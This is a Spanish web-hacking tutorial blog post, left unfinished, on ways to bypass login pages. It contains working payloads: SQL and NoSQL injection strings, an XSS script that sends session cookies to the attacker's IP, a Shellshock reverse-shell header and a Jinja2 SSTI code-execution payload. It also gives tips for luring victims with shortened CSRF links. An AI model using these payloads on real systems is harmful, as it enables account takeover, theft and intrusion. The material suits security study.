---
layout: single
title: Bypassear Logins
excerpt: "En este artículo vamos a ver distintas formas de bypassear un login."
date: 2022-09-28
classes: wide
header:
  teaser: /assets/images/login-bypass/portada.jpg
  teaser_home_page: true
  icon: 
categories:
  - Web-Hacking
tags:  
  - SQLi
  - OSINT
  - IDOR
---

# WORK IN PROGRESS

En este artículo vamos a ver `distintas formas que hay para bypassear un login`, es decir, formas para pasar un login sin necesidad de introducir credenciales, o en su defecto encontrar unas credenciales válidas con las que poder conectarnos con la cuenta de otro usuario. (`NOTA:` también voy a poner `algunos ataques que aunque no son exactamente al panel del loggin`, también sirven para conseguir un usuario de `administrador` con el que tomar el control de la web)

## ÍNDICE

```
  - OSINT
  - IDOR
  - SQLi
  - No SQLi
  - COOKIE HIJACKING (HTML injectio y XSS)
  - CSRF
  - SHELL SHOCK
  - PADDING ORACLE ATTACK con PADDBUSTER
  - BIT FLIPPER ATTACK para PADDING ORACLE ATTACK
  - PASSWORD SPRAYING
  - SSTI
  - CLICKJAKING
  - BUFFER OVERFLOW
  - TYPE JUGGLIN ATTACK
  - DESERIALIZATION ATTACK with Node.js
  - XML --> XXE
```

# OSINT

Puede parecer gracioso pero `no es raro encontrar credenciales validas en internet`. 

Lo primero que tenemos que comprobar es sí para el servicio o la tecnología que esten utilizando hay `credenciales por defecto`, es decir, que tu al comprar eso tienes unas credenciales ya predefinidas, (por ejemplo en las raspberry pi es pi, o en mi instituto la del gmail es aniturri1234). Obviamente eso es lo primero que hay que cambiar cuando nos creamos una cuenta en algún lado... pero `a mucha gente se le olvida o no sabe` que ese usuario o entrada por defecto eso existe.

Otra forma que hay es mirar repositorios de `github`, preguntas en `stack overflow`... relacionados con la web que estamos testeando, ya que muchas veces durante el dessarrollo se publican partes del código y sin darse cuenta hay credenciales en ese código. `Parece estúpido pero es muy común XD`.

Y pues luego también `mirar si se han filtrado anteriormente credenciales` de esa web o de posibles usuarios de la web. 

Y otro consejo: buscar la web en `shodan`, ya que puedes encontrar información interesante y que te sera util. 

![](/assets/images/login-bypass/shodan.PNG)

# IDOR

Pongo esto como el primer método de bypassing, porque es mi favorito, es super gracioso, porque `es absurdo a mas no poder`. Y no es tan conocido, por ejemplo en bug bounty pasa una cosa bastante graciosa que es que la mayoría de personas buscan `XSS` o `SQLi`, pero se olvidan de esta vulnerabilidad tan graciosa. Y por otra parte, hace unos meses le esneñé esta vuln a un amigo que es programador de backend y se sorprendio porque no la conocia y es muy absurda. 

Primero explicaré como se hace y luego el porqué: 

## COMO EXPLOTAR ESTA VULNERABILIDAD  

Hay `dos formas`, `la básica`, y la menos común de encontrar, pero que no por ello tiene menos importancia:

Por ejemplo, nos hemos registrado en una web y queremos cambiar la información del perfil. Para eso, hacemos clic en `http://online-service.thm/profile?user_id=1305` y vemos nuestra información. Pero claro, podemos cambiarnos el `id` a otro. En este punto `si la web esta bien hecha no nos debería dejar`, pero `si no se ha tenido en cuenta que esto pues podríamos acceder a la información de otro perfil`. 

Claro, el ejemplo anterior `se puede complicar` un poco, por ejemplo que al acceder a una página `se mande una petición con la id`, y ahum se puede complicar mas, porque `la id puede viajar hasheada`. Para eso es tan facil como `capturar la petición y cambiar la id`, y si esta hasheada pues descifrar el algoritmo de encriptado (en webs los mas comunes son base64 y md5) y `hashear la nueva id` de esa forma antes de cambiarla en la petición. 

Ejemplo de como puede viajar la petición:

![](/assets/images/login-bypass/IDOR-1.png)

....................................................................................................................................................................................................................................................................................................................................................................................................

....................................................................................................................................................................................................................................................................................................................................................................................................

Y `la forma un poco mas compleja`, `mas común` y que es `mas peligrosa`, ya que `nos permite acceso total`: 

Esta vulnerabilidad sobre todo se da cuando `intentamos entrar` a un directorio (por ejemplo /admin) y `nos redirige` a un login. Entonces la forma mas facil de detectarla es hacer `Wfuzzing` a una web y ver si nos redirige. Sobre todo si el codigo de `la respuesta de la web` es `301` es bastante probable que `sea vulnerable`.

Como ejemplo voy a poner el Fortress Acerva, ya que aunque ese login era un rabit hole, se podia bypassear con un IDOR:

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.13.37.11/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000241:   301        9 L      28 W       315 Ch      "wp-content"
000000274:   401        14 L     54 W       458 Ch      "scripts"                                                            
000000786:   301        9 L      28 W       316 Ch      "wp-includes"
000000834:   301        9 L      28 W       308 Ch      "dev"
000001073:   301        9 L      28 W       315 Ch      "javascript"
000007180:   301        9 L      28 W       313 Ch      "wp-admin"                                                                                             
000011260:   301        9 L      28 W       312 Ch      "backups"                                                                                               
000095524:   403        9 L      28 W       276 Ch      "server-status"      
```

Primero hice Wfuzzing a su web, y uy, el directorio `/wp-admin` da `301` (entre otros) y si intentamos acceder `nos redirige a un login`, asi que apesta a `IDOR`. Por lo tanto voy a intentar `capturar la petición` con `burpsuit` de cuando intento acceder a `/wp-admin`.

Antes de nada necesitamos `modificar` la `configuración` de burpsuit `para interceptar la respuesta del lado del servidor`. Así que nos vamos a la configuración y cambiamos estas dos opciones:

![](/assets/images/login-bypass/IDOR-3.PNG)

Y ahora ya podemos continuar.

Primero voy a intentar acceder sin usar el `proxy para burp`, para que veais el `redirect`:

![](/assets/images/login-bypass/IDOR-2.PNG)

Vemos que nos hace redirect al login, por lo tanto vamos a intentar acceder sin proporcionar credenciales. Para eso lo primero que tenemos que hacer es `activar el proxy con foxy proxy` y `capturar la petición` al intentar acceder a `/wp-admin`:

![](/assets/images/login-bypass/IDOR-4.PNG)

Una vez capturada le daremos a `Forward` y veremos que nos pone la `respuesta del servidor`. Vemos que nos pone `302 Found`:

![](/assets/images/login-bypass/IDOR-5.PNG)

Claro, nosotros no queremos que nos haga un redirect, porque eso significa el codigo 302 (osea, todos los 300 algo), por lo tanto `vamos a cambiarlo` a ver que pasa:

![](/assets/images/login-bypass/IDOR-6.PNG)

Le damos de nuevo a `Forward` y:

![](/assets/images/login-bypass/IDOR-7.PNG)

(no se ve nada porque en esa máquina es un rabit hole, pero en hemos logrado acceso, en caso de que hubiese algo tendriamos acceso a eso, y eso es lo que importa)

Y aquí esta lo gracioso y absurdo de este ataque. `Hemos conseguido acceso` a un directorio en el cual no deberíamos estar XD. Claro, ahora `según hagamos alguna acción` nos va a `detectar` y nos va a mandar al `redirect`, asi que mientras no tengamos un usuario con la capacidad de estar ahí, deberemos `hacer esto para cada cosa que hagamos`.

## PORQUE PASA ESTO Y COMO EVITARLO

Esta vulnerabilidad puede ocurrir cuando un servidor web recibe `input del usuario` para recuperar objetos (archivos, datos, documentos…). Si se pone mucha `confianza en los datos suministrados` en la petición, y `no se validan en la parte de servidor` para `confirmar que el objeto pertenece al usuario que lo pide`, puede darse una `IDOR`.


# SQLi

![](/assets/images/login-bypass/sql-injection.svg)

`El siguiente artículo será sobre esto`, ya que es `un tema muy extenso` que no me parece adecuado explicarlo entero aquí, ya que abarca demasiado. Por lo que aquí solo explicaré en que consiste y un poco por encima como funciona este ataque y como ya he mencionado me adentraré a fondo en el en el siguiente artículo.

## QUE ES Y PORQUE PASA?

Con dice el nombre, `inyectamos código SQL en un input` o campo que tenga acceso a una `base de datos` para así poder interactuar con la BBDD de forma directa, es decir, la BBDD interpretará literalmente la consulta y asi tendremos total acceso a ella, pudiendo ver su contenido... Algo que de otra forma no podríamos hacer. 

`Ejemplo`: hay una página de login donde hay dos campos, user y password (sin tener en cuenta las cookies, la url... que también pueden servir). Claro, nosotros podemos meter esos datos y compará si ese user coincide con esa contraseña, pero si la web `no sanitiza el input` del usuario, permite que se pueda "engañar" a la web y que `en vez de mandarle un user, que le mande nuestra consula SQL`, así la BBDD `interpretará nuestra consulta y nos devolverá lo que nosotros queramos`, por ejemplo; el nombre de la base de datos, de las tablas... (pudiendo ver usuarios, contraseñas, correos electronicos...).

Hay distintas formas (pero eso lo explicaré en el siguiente artículo):

```
  - SQLi
  - SQLi Blind
  - SQLi Mediante el tiempo de la respuesta
  - No SQLi (este lo explico despues)
  - SQLi mediante peticiones
  - ...
```

## COMO EFECTUAR ESTE ATAQUE

(`NOTA:` antes de realizar este ataque es recomendable saber que tipo de BBDD tiene, pero sino se puede probar un poco a fuerza bruta, ya que no es lo mismo MySQL, que SQLserver, que SQL... (si no se especifica `sqlmap` prueba todas a fuerza bruta, pero si se especifica se pueden lograr mejores resultados en menos tiempo)

Para explicar un poco por encima `como funcionan las consultas SQL`, poruqe `lo mas importante` que tenemos que saber es `como funcionan las BBDD`  y `como funcionan las cunsultas SQL`. Y ver como utilizarlas para realizar este ataque voy a poner un ejemplo muy básico (`nota:` los ataques que se hacen en un entorno real son mas complicados, pero eso lo explicaré en otro artículo, porque sino este sera demasiado largo)

Ejemplo consultas SQL:

Considere una aplicación de compras que muestre productos en diferentes categorías. Cuando el usuario hace clic en la categoría Regalos, su navegador solicita la URL:

```
https://insecure-website.com/products?category=Gifts
```

Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta consulta SQL pide a la base de datos que devuelva:

```
  - todos los detalles (*)
  - de la tabla de productos
  - donde la categoría es Regalos
  - y liberado es 1.
```

La restricción se está utilizando para ocultar los productos que no se liberan. Para productos inéditos, presumiblemente . `released = 1released = 0`

La aplicación no implementa ninguna defensa contra los ataques de inyección SQL, por lo que un atacante puede construir un ataque como:

```
https://insecure-website.com/products?category=Gifts'--
```

Esto da como resultado la consulta SQL:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

La clave aquí es que la secuencia de doble guión es un indicador de comentario en SQL, y significa que el resto de la consulta se interpreta como un comentario. Esto elimina efectivamente el resto de la consulta, por lo que ya no incluye . Esto significa que se muestran todos los productos, incluidos los productos no lanzados. `--AND released = 1`

Yendo más allá, un atacante puede hacer que la aplicación muestre todos los productos de cualquier categoría, incluidas las categorías que no conoce:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Esto da como resultado la consulta SQL:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

La consulta modificada devolverá todos los artículos en los que la categoría sea Regalos o 1 sea igual a 1. Como siempre es verdadero, la consulta devolverá todos los elementos. `1=1`

.............................................................................................................................................................

.............................................................................................................................................................

Claro, ese es un ataque muy simple, pero se pueden hacer cosas mas complejas como listar la BBDD, es decir, ver que BBDD hay y su nombre, las tablas que tiene, las columnas...

Por ejemplo:

Para listar la BBDD:

```
' union select database()-- -
```

En caso de que huviese mas columnas, por ejemplo 4 y la cuarta fuese la que interpreta:

```
' union select 1,2,3,database()-- - 
```

Para ver la version de la BBDD:

```
' union select version()-- -
```

Para listar otras BBDD-s existentes:

```
' union select schema_name from information_schema.schemata-- -
```

Ver las tablas de otra base de datos que hemos encontrado:

```
' union select table_name from information_schema.tables where table_schema="{nombre de la BBDD}"-- -
```

Ver las columnas de una tabla de esa otra BBDD:

```
' union select column_name from information_schema.columns where table_schema="{nombre de la BBDD}" and table_name="{nombre de la tabla}"-- -
```

(`NOTA:` lo explicaré bien en el siguiente artículo, y también explicaré `sqlmap` en ese artículo)

## PREVENCIÓN

Aunque se podrían `sanear las entradas` usando métodos como `mysqli_real_escape_string`, es más recomendable la `utilización de sentencias preparadas o parametrizadas`. Las sentencias preparadas te permitirán ejecutar la misma sentencia con gran eficiencia.

`Tips` para incrementar la seguridad:

```
  1- No confiar en el input del usuario, filtrar el input para bloquear caracteres que puedan estar en consultas SQL (/`'%&="|!¡;:.,)
  2- Bloquear palabras en el input como SELECT, FROM, WHERE...
  3- Verificar y filtrar parametros que no solo sean inputs, por ejemplo logins, sino que también: parámetros de entrada y campos tipo hidden de las páginas web, coockies, url...
  4- No utilizar sentencias SQL construidas dinámicamente.
  5- No proporcionar mayor información de la necesaria.
```

# No SQLi

Esto se basa en un concepto que hemos visto antes que era que si la respuesta era `algo o sino 1=1` se bypasseaba el login porque se cumplia lo de 1=1, pero esta vez tenemos que decir que `la contraseña es distinta a algo`, entonces `interpreta como valido` y bypassea el login.

`Hay dos formas`, si no funciona la primera hay que probar la segunda:

`PRIMERA:`
En esta no tocaremos la petición mas que para `cambiar` un poco la parte de las `credenciales`. Siempre que tenga un `formato parecido` cambiaremos la linea por la siguiente (vale admin o cualquier otro usuario que sepamos que existe):

```
user=admin&password[$ne]=uwu
```

`SEGUNDA:`

El anterior metodo no siempre funciona, pero tambien podemos mandar la 	informacion en `json`, así que:

Primero en burpsuite en `capturamos la petición` del login y `cambiamos` la linea donde pone `Content-Type` por: Content-Type: `aplication/json`
luego `donde el user y password lo reemplazaremos por` lo siguiente:
	
  ```json  
{
	"user": "admin",
	"password":{
		"$ne":"uwu"
	}
}
```

# COOKIE HIJACKING

Antes de ver como robar cookies de otros usuarios para poder logearnos como ellos sin sus credenciales, debemos ver que es el HTML injection y el Cross Site Scripting (XSS).

## HTML injection

Esto sobre todo lo usamos para `comprobar` si una web es `vulnerable a XSS`.

Para esto buscaremos un directorio donde nos permita `escribir` texto y que `lo muestre` (como con un print) y `escribiremos` alguna de las siguientes opciones:

(en este caso el texto se pondrá mas grande)

```
<h1> Holi </h1>
```

(el texto se desplazará)

```
<marquee> Holi </marquee>
```

Si ha funcionado el texto se verá para todos como lo hayamos puesto. Claro, esto lo podemos hacer con comandos maliciosos en vez de una tonteria como esta, y en ese caso si que puede ser peligroso.

## Cross Site Scripting (XSS)

Ahora vamos a probar otra cosa con la que podemos comprobar si una web es vulnerable. Vamos aintentar poner un `pop up` con el mensaje que queramos:

```
<script>alert("XSS vulnerability found uwu")</script>
```

![](/assets/images/login-bypass/XSS-meme.jpg)

## Cookie Hijacking

Claro, con esto podemos hacer que al ver el mensaje `nos mande la coockie de sesion del usuario` que ha visto el mensaje.

Primero tenemos que crear un `servidor http` al que `nos lleguen las cookies`:

```
> python -m SimpleHTTPServer 443
```

Ahora escriviremos en un sitio donde sepamos que lo van a `ver otras personas` (o si queremos robarle `a una persona en específico` pues podemos hacer mediante `ingenieria social` que mire ese sitio web). Con el siguiente código lo que pasará es que los usuarios `veran una foto como con un error` de que no se ha podido encontrar, pero por detras `nos estará mandando la cookie de sesión` de cada usuario que lo vea:

```
<script>document.write('<img src="<http://{mi ip}:{443}/pentesting.jpg?cookie=' + document.cookie + '>">') </script>

```

Ahora la idea es que sin estar autenticado, con la extension de google `Edit this cookie` podremos `cambiarnos la cookie` por la que se nos muestre en el servidor http de la consola y pues se nos `cambiaria la sesión a la del propietario de la cookie capturada`.

# CSRF (Cross Site Request Forgery)

Consiste en que cuando un usuario acceda a una web desde una `url` que mediante `ingenieria social` se le hace clicar, se apliquen `cambios para esa cuenta`. Es decir, que clicando en una url que le mandemos se le cambie la contraseña a la que nosotros queramos.

Primero tendremos que `capturar una petición` con burpsuite, en un directorio donde puedas `logearte` (osea, meter user y password).

Al loguearte tienes que `interceptar` con burpsuit la petición que se manda por `POST`, y nosotros lo que intentaremos es que se mande por `GET`, hacemos `Control + R` para mandarlo al repeater, hacemos `click derecho` y le damos a `change request method` para que se ponga como `GET`, entonces ahora la información esta viajando `en la propia url como parametro`, entonces si le damos a `Go` y `funciona` con GET igual que funcionaba con POST, osea que ponga password updated seria `vulnerable`, y eso es muy peligroso, así que si `mandamos la url a alguien` con un `acortador de link` y usamos `ingenieria social` para que alguien se meta podriamos cambiarlo la contraseña a la víctima.

`IMPORTANTE` aclarar que al conseguir la url maliciosa en burpsuite nos saldrá algo parecido a lo siguiente:

```
/change_pass.php?password=hola123&confirm_password=hola123&submit=submit 
```

Entonces copiamos eso y `lo añadimos a la url` (sin directorios adicionales) osea:

```
http://hacked.com/{la url maliciosa que hemos conseguido en burpsuit}

http://hacked.com/change_pass.php?password=hola123&confirm_password=hola123&submit=submit 
```

`IMPORTANTE:` y por Último tenemos que pasar esa url por un `acortador de links` para que no se vea que es una url maliciosa.

Y cuando la víctima cae en la trampa el redirect pasa tan rápido que es imposible darse cuenta, aunque en algunas webs pone que la contraseña se ha cambiado.

# SHELL SHOCK

Esto pasa cuando `la página de login` tiene el formato `(.cgi  ,  .pl  ,  .sh  ,  ...)`, entonces a traves del `user agent` podemos `ejecutar comandos` de forma remota. Claro, entonces con eso nos podemos mandar una `reverse shell`.

Primero ponemos a la escucha un puerto con `netcat`.

En burpsuit ponemos a `interceptar peticiones` y recargamos la pagina de login.

En la petición capturada `cambiamos` la linea del `User Agent:` para poner lo siguiente:

```
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{mi ip}/{puerto} 0>&1
```

Le damos a `Forward` y se supone que ganaríamos `acceso al sistema`, si no funciona, lo intentaríamos un par de veces más, por si acaso, y si sigue sin funcionar pues a mirar 	que emos hecho mal.

# PADDING ORACLE ATTACK con PADDBUSTER

Esto basicamente es la explotación de un algoritmo de encriptacion (`cifrado cvc`). Consiste en que un texto claro lo separa en `bloques` para `encriptarlos individualmente`, por lo tanto tendremos que`saber el numero de bloques` para poder desencriptarlos, juntarlos y tener el texto. `Si no sabemos el numero de bloques` podemos probar uno a uno a `fuerza bruta`.

Ejemplo: tenemos un campo de inicion de sesion y uno de registro.

(Creo que no lo he explicado antes y es importante, cuando pongo {parámetro} tienes que reemplazarlo por el parámetro especificado y eliminar las llaves, es decir {ip} = 10.0.2.14) 

```
> padbuster {url en el directorio de registro} {mi coockie de sesion} {numero de bloques} -coockie "auth={micoockie de sesion}" -encoding 0
```

Nos dará una `lista de bloques vulnerables`, `la recomendada` es la que tenga `**`, la seleccionamos escribiendo el `id`. irá probando uno a uno los bytes, de 8 a 1 e irá desencriptando los bloques, luego los junta y da el mensaje, en este caso que estamos con una pajina de loguin `nos dara` algo parecido a `user={nuestro nombre del usuario}` (aunque puede ser diferente), claro, ya sabemos como se computan los `permisos en base a las cookies`, así que vamos a usarlo para `loguearnos como admin`.

```
> padbuster {url en el directorio de registro} {mi coockie de sesion} {numero de bloques} -coockie "auth={micoockie de sesion}" -encoding 0 -plaintext user=admin"
```

Con esto hacemos un `cookie hijacking` entonces pegamos la cookie que nos haya dado padbuster en `Edit this coockie` y listo

ES IMPORTANTE ACLARAR QUE `PADBUSTER TARDA MUCHO` asi que aprobecha a merendar, echarte la siesta o hacer cualquier cosa XD

# BIT FLIPPER ATTACK para PADDING ORACLE ATTACK

Una cosa rara que pasa en el `cifrado cvc` nos `registramos` con `{nombre de usuario existente}=` nos `logueariamos como ese usuario`, y si el usuario {nombre de usuario existente}= existe, tendríamos que `añadirle otro =` y si existe pues más de lo mismo, claro, así nos podríamos loguear como admins XD: `admin=`

Pero lo vamos a hacer de una forma mas lógica, con un `bit flipper attack`:

Nos registramos con un `nombre parecido a admin`, por ejemplo `bdmin` y tenemos que `interceptar esa petición` con burpsuit, luego le damos a `Control + I` para mandarlo al intruder, vamos a `Intruder --> Position` y a la petición que he mos mandado al intruder y le damos a `clear`. Seleccionamos la `cookie` y le damos a `Add`.

La idea es que como solo hemos cambiado un caracter y el `cifrado es cvc`, osea, que lo encripta por bloques, `solamente el primer bloque sera distinto`, lo demas será igual, entonces podemos probar las posibles variaciones del primer bloque para mediante pruebas `conseguir la misma cookie encriptada que usaria el user admin haciendo menos intentos` que si probasemos con todas las convinaciones de la cookie completa.

Ahora tenemos que `cambiar el primer bloque`, para que coincida con la cookie del usuario admin.

Para eso vamos a `payloads` y donde pone `Payload type` seleccionamos el ataque `Bit flipper`, en `Format of original data:` clicamos en `Literal value` y queremos que lo haga en todos los bits, asi que `seleccionamos todos`.

Ahora vamos a `Options` y en `Grep-Extract` le damos a `Add`, le damos a `Refetch response`, seleccionamos y copiamos `You are currently logged in as bdmin!` para luego saber cuando nos logueamos como admin, le damos a `Ok` y luego le damos a `Start attack`.

En la nueva pestaña quenos ha abierto tendremos que ir mirando en la parte donde pone `<p>\n\x09<center>` veremos cuando pone `You are currently logged in as admin!` así que `clicamos ahí` y en `Request podremos` `ver la cookie` de sesión de admin, así que la copiamos, vamos al panel de inicio de sesion de la web y nos la cambiamos con `Edit this coockie`.

Si no nos deja podemos `hacer de nuevo la petición como bdmin` e interceptarla, luego `cambiamos la coockie` de esa peticion por la que habiamos conseguido de admin y le damos a `Forward`. Y listo, ya estaríamos logeados como admin. 

# PASSWORD SPRAYING

Esto va a ser un poco copia pega del artículo que ya hice, pero bueno XD

![](/assets/images/web-hacking/password-spraying/password-spraying-2.jpg)

Este ataque lo hacemos cuando tenemos un `número de intentos limitados` para loguearnos en algún lugar, es decir, cuando nos bloquean los intentos o nos hacen esperar después de 3 o 5 intentos (puede ser un número distinto), por lo tanto, `no` podemos hacer `fuerza bruta` de las contraseñas `(hay que tener en cuenta que al igual que la fuerza bruta, solo es recomendable recurrir a esta técnica cuando no nos queda nada más por intentar, ya que al igual que la fuerza bruta hacemos mucho ruido, por lo que somos bastante detectables)`. Este ataque se puede resumir en cinco palabras: `pocas contraseñas para muchos usuarios`.

## EN QUE CONSISTE ESTA TÉCNICA:

Como ya he mencionado `esta técnica la utilizamos` cuando `no` podemos hacer `fuerza bruta` porque tenemos un `número limitado de intentos` de ingresar contraseñas en un login. Hay que recalcar que `cuantos más usuarios` haya registrados, nuestra `posibilidad` de acierto es `mayor`.

A diferencia de cuando utilizamos fuerza bruta, probamos un `número muy pequeño` de posibles `contraseñas`, normalmente utilizamos las más habituales, pero dependiendo cuál es el objetivo podemos utilizar otras. Y `probamos esas contraseñas` en `todos los usuarios` a ver si tenemos suerte y una funciona.

Es `verdad que `a` veces` se suele utilizar ``una única contraseña`` para `minimizar el tiempo` que tardemos en encontrar un usuario y contraseña válido, `o` también para intentar `minimizar un poco el ruido` que hagamos, pero `si tenemos la posibilidad` de utilizar más de una contraseña `es recomendable utilizarlas` para aumentar nuestras posibilidades de acierto.

Y en caso de no conocer los usuarios, sí que los podemos probar a fuerza bruta con un listado de posibles usuarios.

`Entonces resumiendo: esta técnica consiste en tener un listado de usuarios (o posibles usuarios) y otro listado muy pequeño de contraseñas y probar esas pocas contraseñas en todos los usuarios.`

Aquí dejo una foto en la que se explica bastante bien y de forma visual en que consiste esta técnica.

![](/assets/images/web-hacking/password-spraying/example.webp)

## COMO EXPLOTAR ESTA TÉCNICA:

Por lo que he estado viendo, hay varias herramientas para este tipo de ataque; `burpsuit`, `herramientas que hay en github`... O incluso podríamos crar un `script` que lo haga, no sería muy complicado.

Pero yo aquí solo voy a enseñar a hacer el ataque con `burpsuit`, para `webs`, ya que lo puedo probar con una máquina de HTB sin complicarme mucho.

`(en esta explicación doy por hecho que ya sabes utilizar burpsuit, si no sabes primero aprende aunque sea como capturar peticiones (es muy simple) y luego ya vuelve aquí)`

Para esto primero tendremos que capturar la petición del loguin y en burpsuit la mandaremos al `intruder` con `Ctl + I`:

![](/assets/images/web-hacking/password-spraying/attack-1.PNG)

Luego cambaremos el tipo de ataque a `Claster Bomb` y si no nos ha marcado los campos de la `user` y el `password`, los marcamos nosotros:

![](/assets/images/web-hacking/password-spraying/attack-2.PNG)

Ahora vamos a `Payload` y configuramos el primer campo metiendole la lista de `usuarios`:

![](/assets/images/web-hacking/password-spraying/attack-3.PNG)

Y en el segundo campo hacemos lo mismo pero con las `contraseñas`:

![](/assets/images/web-hacking/password-spraying/attack-4.PNG)

Ahora ya le damos a `Start attack` y ya debería empezar el ataque, y nos mostrará algo asi si encuentra la contraseña (no debo de tener bien configurado el burpsuit o yo que se y se queda en negro, pero pondré otro ejemplo de como se debería ver), `Sabemos que es el resultado valido porque tiene el Leght mas alto)`:

![](/assets/images/web-hacking/password-spraying/attack-5.png)

Y ya estaría uwu.

## COMO PREVENIR ESTA TÉCNICA:

Las formas de prevención de este ataque son bastante lógicas y son las mismas que para todos estos tipos de ataques a contraseñas:

```
·Tener una contraseña robusta (que tenga números, letras minúsculas y mayúsculas, caracteres raros...)

·Cambiar la contraseña de vez en cuando.

·No utilizar la misma contraseña para todo.

·Utilizar doble factor de autenticación.

```

# SSTI (Server Side Template Injection)

Esto pasa cuando tenemos un campo en el que podemos `escribir texto` y nos da una `respuesta`, un mensaje, un login...
Para probar si un campo es vulnerable podemos poner: `{{7*7}}` y si la respuesta da `49` significa que `es vulnerable`.

## COMO EXPLOTAR LA VULNERABILIDAD

Para conseguir `Remote Code Execution` mediante esta vulnerabilidad:

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

Ahora si `cambiamos` el parametro `id` por un comando podremos tener `ejecución remota de comandos`.

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection
```

En ese repositorio de github también hay cosas interesantes para otros ataques.

## PORQUE PASA ESTO?


